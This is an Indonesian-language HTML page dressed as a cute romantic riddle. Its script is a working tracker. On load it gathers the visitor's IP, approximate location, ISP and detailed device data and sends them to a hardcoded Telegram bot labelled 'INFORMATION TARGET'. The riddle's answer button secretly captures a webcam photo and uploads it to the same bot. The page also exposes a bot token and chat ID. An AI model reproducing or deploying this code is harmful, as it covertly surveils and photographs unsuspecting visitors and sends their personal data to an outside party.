<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
}

.btn:active {
  transform: translateY(-1px);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>

  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>

  <h1>KAMU TAU GAAAA</h1>

  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>

  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>

  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
const BOT_TOKEN="8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ipwhois.io
async function getIpInfo(){
  try{
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0",
      timezone: data.timezone || "-",
      isp: data.isp || "-",
      asn: data.asn || "-",
      currency: data.currency || "-"
    };
  }catch(e){
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
  }
}

// Ambil device info lebih lengkap
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  
  // Info koneksi
  let connectionInfo = {};
  if (navigator.connection) {
    connectionInfo = {
      effectiveType: navigator.connection.effectiveType || "-",
      downlink: navigator.connection.downlink || "-",
      rtt: navigator.connection.rtt || "-",
      saveData: navigator.connection.saveData || "-"
    };
  }
  
  // Info plugins
  let pluginsInfo = "-";
  if (navigator.plugins && navigator.plugins.length > 0) {
    pluginsInfo = Array.from(navigator.plugins).map(p => p.name).join(', ');
  }
  
  return {
    // Basic info
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(', ') : "-",
    
    // Screen info
    screenWidth: screen.width,
    screenHeight: screen.height,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    colorDepth: screen.colorDepth || "-",
    pixelRatio: window.devicePixelRatio || "-",
    orientation: screen.orientation?.type || "-",
    
    // Device info
    cores: navigator.hardwareConcurrency || "-",
    memory: navigator.deviceMemory || "-",
    touchPoints: navigator.maxTouchPoints || 0,
    
    // Browser info
    vendor: navigator.vendor || "-",
    product: navigator.product || "-",
    
    // Network info
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "-",
    connection: connectionInfo,
    
    // Battery info
    battery: b,
    
    // Additional info
    plugins: pluginsInfo,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: new Date().toString(),
    utcTime: new Date().toUTCString(),
    referrer: document.referrer || "-",
    
    // Browser capabilities
    webdriver: navigator.webdriver ? "Yes" : "No",
    pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
    javaEnabled: navigator.javaEnabled ? "Yes" : "No"
  };
}

// Build caption Telegram dengan format blockquote dan emoji
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  
  return [
    "<b>🌍 INFORMATION TARGET</b>",
    `<blockquote>`,
    `🌐 IP: ${escapeHtml(ip.ip)}`,
    `🏙️ City: ${escapeHtml(ip.city)}`,
    `🗺️ Region: ${escapeHtml(ip.region)}`,
    `🇮🇩 Country: ${escapeHtml(ip.country_name)}`,
    `🏳️ Country Code: ${escapeHtml(ip.country_code)}`,
    `📍 Latitude: ${escapeHtml(ip.latitude)}`,
    `📍 Longitude: ${escapeHtml(ip.longitude)}`,
    `🗺️ Location: ${g}`,
    `⏰ Timezone: ${escapeHtml(ip.timezone)}`,
    `📡 ISP: ${escapeHtml(ip.isp)}`,
    `🔗 ASN: ${escapeHtml(ip.asn)}`,
    `💰 Currency: ${escapeHtml(ip.currency)}`,
    `</blockquote>`,
    "",
    "<b>💻 Device Info</b>",
    `<blockquote>`,
    `🖥️ User Agent: ${escapeHtml(d.userAgent)}`,
    `⚙️ Platform: ${escapeHtml(d.platform)}`,
    `🗣️ Language: ${escapeHtml(d.language)}`,
    `🌐 Languages: ${escapeHtml(d.languages)}`,
    `📱 Vendor: ${escapeHtml(d.vendor)}`,
    `🛍️ Product: ${escapeHtml(d.product)}`,
    `</blockquote>`,
    "",
    "<b>📱 Screen & Display</b>",
    `<blockquote>`,
    `📺 Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
    `🪟 Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
    `⚖️ Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `📐 Orientation: ${escapeHtml(d.orientation)}`,
    `</blockquote>`,
    "",
    "<b>⚙️ Hardware Specs</b>",
    `<blockquote>`,
    `🔢 CPU cores: ${escapeHtml(d.cores)}`,
    `💾 RAM (GB): ${escapeHtml(d.memory)}`,
    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
    `</blockquote>`,
    "",
    "<b>🌐 Network & Connection</b>",
    `<blockquote>`,
    `📶 Online: ${escapeHtml(d.online)}`,
    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
    `🚫 Do Not Track: ${escapeHtml(d.doNotTrack)}`,
    `📡 Connection Type: ${escapeHtml(d.connection.effectiveType)}`,
    `⬇️ Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
    `⏱️ RTT: ${escapeHtml(d.connection.rtt)} ms`,
    `💾 Save Data: ${escapeHtml(d.connection.saveData)}`,
    `</blockquote>`,
    "",
    "<b>🔋 Battery Info</b>",
    `<blockquote>`,
    `🔋 Battery: ${escapeHtml((d.battery?.level * 100 || "-") + "%")}`,
    `⚡ Charging: ${escapeHtml(d.battery?.charging ? "Yes" : "No")}`,
    `⏳ Charging Time: ${escapeHtml(d.battery?.chargingTime || "-")}s`,
    `⌛ Discharging Time: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
    `</blockquote>`,
    "",
    "<b>🕒 Time & Location</b>",
    `<blockquote>`,
    `🌍 Timezone: ${escapeHtml(d.timezone)}`,
    `🕐 Local Time: ${escapeHtml(d.localTime)}`,
    `⏰ UTC Time: ${escapeHtml(d.utcTime)}`,
    `</blockquote>`,
    "",
    "<b>🔌 Plugins & Extras</b>",
    `<blockquote>`,
    `🧩 Plugins: ${escapeHtml(d.plugins)}`,
    `🤖 WebDriver: ${escapeHtml(d.webdriver)}`,
    `📄 PDF Viewer: ${escapeHtml(d.pdfViewer)}`,
    `☕ Java Enabled: ${escapeHtml(d.javaEnabled)}`,
    `🔗 Referrer: ${escapeHtml(d.referrer)}`,
    `</blockquote>`,
    "",
    "<b>🔗 URL & Session</b>",
    `<blockquote>`,
    `🌐 URL: ${escapeHtml(location.href)}`,
    `⏰ Time (UTC): ${escapeHtml(new Date().toISOString())}`,
    `</blockquote>`
  ].join("\n");
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  try {
    const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: STATIC_IMAGE,
        caption: buildCaption(ip,d),
        parse_mode:"HTML"
      })
    });
  } catch(e) {
    console.log("Error sending device info:", e);
  }
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "📸 SUKSES SCREENSHOT FOTO TARGET!");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
  }catch(e){
    console.log("yahhh", e);
  }
}

// Jalankan saat halaman load
window.addEventListener("load",sendIpDevice);

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
</body>
</html>
